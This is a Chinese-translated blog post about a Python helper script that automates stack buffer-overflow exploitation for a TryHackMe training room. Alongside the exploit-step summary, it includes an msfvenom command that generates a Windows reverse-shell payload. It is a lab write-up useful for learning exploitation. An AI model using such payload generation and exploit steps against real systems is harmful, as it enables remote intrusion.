<html>
<head>
<title>Automation of Buffer-Overflow</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">缓冲区溢出的自动化</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/automation-of-buffer-overflow-b7252d77e72e?source=collection_archive---------2-----------------------#2022-11-04">https://infosecwriteups.com/automation-of-buffer-overflow-b7252d77e72e?source=collection_archive---------2-----------------------#2022-11-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="02ce" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Python中我的基于堆栈的缓冲区溢出辅助程序的代码解释</h2></div><p id="e48c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在本文中，我不是在讲授缓冲区溢出，也不是在展示我用python编写的缓冲区溢出助手程序的演示。我要谈谈我是如何创建这个程序的。</p><ul class=""><li id="70ad" class="lb lc iq kh b ki kj kl km ko ld ks le kw lf la lg lh li lj bi translated">(<strong class="kh ir">推荐首先</strong>了解缓冲区溢出:【https://tryhackme.com/room/bufferoverflowprep】T2</li><li id="a154" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">检查我的程序的演示:<a class="ae lk" href="https://youtu.be/3nSAHeJ2YpQ" rel="noopener ugc nofollow" target="_blank">Python中的缓冲区溢出自动化</a></li><li id="98e7" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">缓冲区溢出辅助程序:<a class="ae lk" href="https://github.com/PakCyberbot/Buffer-Overflow-Assistant" rel="noopener ugc nofollow" target="_blank">https://github.com/PakCyberbot/Buffer-Overflow-Assistant</a></li></ul><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi lq"><img src="../Images/a381d035c63fc3a41afe520c7d4fef71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FH042FZAgGTldA48-6sT8Q.png"/></div></div></figure><h1 id="781a" class="mc md iq bd me mf mg mh mi mj mk ml mm jw mn jx mo jz mp ka mq kc mr kd ms mt bi translated">我是如何想到这个项目的？</h1><p id="1796" class="pw-post-body-paragraph kf kg iq kh b ki mu jr kk kl mv ju kn ko mw kq kr ks mx ku kv kw my ky kz la ij bi translated">我正在做<a class="ae lk" href="https://tryhackme.com/room/bufferoverflowprep" rel="noopener ugc nofollow" target="_blank">TryHackme Room on Buffer-Overflow</a>。我必须解决上面的10个任务。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi mz"><img src="../Images/1e8c5b26dea9cf210ca24e7721043fc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2ugS_xxyDl0PKj7dFMLwCQ.png"/></div></div></figure><p id="d96e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我通过理解基于堆栈的缓冲区溢出利用的每个步骤，手动完成了第一项任务。感谢<a class="na nb ep" href="https://medium.com/u/16a5c5e916e4?source=post_page-----b7252d77e72e--------------------------------" rel="noopener" target="_blank"> Tib3rius </a>为这个房间和他的<a class="ae lk" href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst" rel="noopener ugc nofollow" target="_blank">关于缓冲区溢出的知识库</a>。在掌握了这些步骤之后，我想用我的缓冲区溢出助手来完成剩下的9个任务，所以我给了时间来创建它。</p><blockquote class="nc nd ne"><p id="1ef1" class="kf kg nf kh b ki kj jr kk kl km ju kn ng kp kq kr nh kt ku kv ni kx ky kz la ij bi translated">花4个小时创造或学习新事物比花2个小时做重复性的工作要好。</p></blockquote><h1 id="536a" class="mc md iq bd me mf mg mh mi mj mk ml mm jw mn jx mo jz mp ka mq kc mr kd ms mt bi translated">代码解释</h1><p id="0818" class="pw-post-body-paragraph kf kg iq kh b ki mu jr kk kl mv ju kn ko mw kq kr ks mx ku kv kw my ky kz la ij bi translated">我在我的程序中重用了<strong class="kh ir"> Fuzzing </strong>和<strong class="kh ir"> Exploit </strong>来自<a class="ae lk" href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst" rel="noopener ugc nofollow" target="_blank"> Tib3rius </a>的代码，然后首先处理程序的配色方案和简单介绍。之后，我使用了<strong class="kh ir"> pyperclip </strong>模块来为用户自动复制mona命令，这样它们就可以直接粘贴了。</p><p id="dc87" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我为不同的任务使用了不同的配色方案，这样眼睛可以很快捕捉到它们。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nj"><img src="../Images/a435d386a8d70e2705e7e91f8f7a8f4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H6XHPAZqmVE8Gyd7Yex_KQ.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">绿色:自动复制到剪贴板的文本</figcaption></figure><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi no"><img src="../Images/4ca943e9efe8cf6c8687b33b3af2d585.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VkgHakaCYGi7rz2nQdKsPA.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">蓝色:接受用户的输入</figcaption></figure><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi np"><img src="../Images/3315b87314e5ea0b3dda6b1dac7b8df6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SBYJsAfLVgGYKQIaZWnWJw.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">红色:提醒用户在进一步操作之前，在抗干扰调试器中重新启动易受攻击的应用程序</figcaption></figure><p id="fe5b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我还使用了<strong class="kh ir"> os.popen() </strong>以便程序从Metasploit生成有效负载，并在代码本身中使用它。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nq"><img src="../Images/3bdc1d857cad50c516d5bb82446ed9fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2P48HMHpAP7E9b0CuuHrAA.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">使用pattern_create ruby脚本</figcaption></figure><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nr"><img src="../Images/a2062b56b0335871960246377d6a2f56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QuTfik9OZTC_B8q0snN4eQ.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">Bofy使用msfvenom生成有效载荷</figcaption></figure><p id="f655" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当MsfVenom生成有效负载时，它会给出一些不用于有效负载的额外字符作为输出。所以我用<strong class="kh ir"> grep </strong>和<strong class="kh ir"> tr </strong> Linux命令只过滤掉十六进制数据。</p><pre class="lr ls lt lu gt ns nt nu nv aw nw bi"><span id="f3af" class="nx md iq nt b gy ny nz l oa ob"># filter out the payload using grep and tr</span><span id="3e15" class="nx md iq nt b gy oc nz l oa ob">payload = os.popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()</span></pre><p id="1550" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">每当python程序从stdin获取输入时，它都会对\ characters进行转义，这意味着:</p><pre class="lr ls lt lu gt ns nt nu nv aw nw bi"><span id="9162" class="nx md iq nt b gy ny nz l oa ob">payload = input('Value in hex : ')      #Value in hex : \x63<br/># payload = '\\x61' whereas I have to give same as the input so</span><span id="cd65" class="nx md iq nt b gy oc nz l oa ob">payload = payload.encode('utf-8').decode('unicode_escape')<br/># payload = '\x61'  hex in 61 is 'a' in ascii</span></pre><p id="3ce1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Exploit()方法简单总结:</p><ul class=""><li id="bdb5" class="lb lc iq kh b ki kj kl km ko ld ks le kw lf la lg lh li lj bi translated">求EIP偏移(<em class="nf">有效载荷=生成模式</em>)</li><li id="81fe" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">测试EIP偏移量(<em class="nf">EIP偏移量= &lt;偏移量&gt;&amp;retn =‘BBBB’</em>)</li><li id="2086" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">找到bad chars(<em class="nf">payload = byte _ array</em>)</li><li id="7560" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">找到跳转点(<em class="nf">retn = Jump _ Point _ Address</em>)</li><li id="7660" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">利用(<em class="nf">payload = MSF venom _ payload</em>)</li></ul><h1 id="f9ed" class="mc md iq bd me mf mg mh mi mj mk ml mm jw mn jx mo jz mp ka mq kc mr kd ms mt bi translated">(<em class="od">更新</em>)我的程序结果:</h1><p id="0101" class="pw-post-body-paragraph kf kg iq kh b ki mu jr kk kl mv ju kn ko mw kq kr ks mx ku kv kw my ky kz la ij bi translated">完成程序后，我用它解决了剩下的9个任务。完成这9项任务只花了15分钟。😎</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi oe"><img src="../Images/661f191d04ad1ba19ce49f719dfc7228.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xAlVlSJnflWe0GAsQHEvCA.png"/></div></div></figure><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi of"><img src="../Images/904a4cb97ee347e16822d7cc1f2bd113.png" data-original-src="https://miro.medium.com/v2/resize:fit:1246/format:webp/1*WJM57z9zA2q4RMMegl-PuA.jpeg"/></div></figure><p id="f4f2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="nf">注意:</em>我没有编写代码来验证坏字符的删除。这个程序可能有一些错误，还没有很多功能。你可以在我的<a class="ae lk" href="https://github.com/PakCyberbot" rel="noopener ugc nofollow" target="_blank"> GitHub </a>上报告这个错误，我们非常感谢你的合作。</p><p id="b8e8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要了解更多信息，您可以关注我:</p><ul class=""><li id="ab34" class="lb lc iq kh b ki kj kl km ko ld ks le kw lf la lg lh li lj bi translated">推特:<a class="ae lk" href="https://twitter.com/PakCyberbot" rel="noopener ugc nofollow" target="_blank">https://twitter.com/PakCyberbot</a></li><li id="f3f3" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">领英:<a class="ae lk" href="https://www.linkedin.com/in/pakcyberbot/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/pakcyberbot/</a></li><li id="f208" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">中:<a class="ae lk" href="https://pakcyberbot.medium.com/" rel="noopener">https://pakcyberbot.medium.com/</a></li><li id="ec5e" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">GitHub:<a class="ae lk" href="https://github.com/PakCyberbot" rel="noopener ugc nofollow" target="_blank">https://github.com/PakCyberbot</a></li><li id="f481" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">insta gram:<a class="ae lk" href="https://www.instagram.com/pakcyberbot/" rel="noopener ugc nofollow" target="_blank">https://www.instagram.com/pakcyberbot/</a></li><li id="9cb6" class="lb lc iq kh b ki ll kl lm ko ln ks lo kw lp la lg lh li lj bi translated">YouTube:<a class="ae lk" href="https://www.youtube.com/@pakcyberbot" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/@pakcyberbot</a></li></ul><p id="535c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我希望你能从这篇文章中学到一些新的东西。欢迎在下面的评论区提出反馈或建设性的批评！</p></div><div class="ab cl og oh hu oi" role="separator"><span class="oj bw bk ok ol om"/><span class="oj bw bk ok ol om"/><span class="oj bw bk ok ol"/></div><div class="ij ik il im in"><h2 id="55d9" class="nx md iq bd me on oo dn mi op oq dp mm ko or os mo ks ot ou mq kw ov ow ms ox bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lk" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>